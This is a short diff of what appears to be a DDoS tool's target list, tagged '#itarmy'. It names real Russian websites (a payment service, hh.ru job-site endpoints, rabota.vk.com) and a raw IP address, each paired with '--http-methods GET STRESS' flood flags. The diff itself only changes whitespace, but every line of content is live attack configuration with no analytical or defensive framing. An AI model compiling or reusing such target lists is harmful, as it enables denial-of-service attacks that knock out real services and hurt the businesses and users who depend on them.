@@ -3,12 +3,8 @@
 https://payanyway.ru --http-methods GET STRESS 
 tcp://185.111.84.213:443 
 
-
-
-
-
 #itarmy
- 
+
 https://rest-domains.hh.ru http://rest-domains.hh.ru --http-methods GET STRESS 
 https://hh.ru http://hh.ru --http-methods GET STRESS
 https://rabota.vk.com http://rabota.vk.com --http-methods GET STRESS
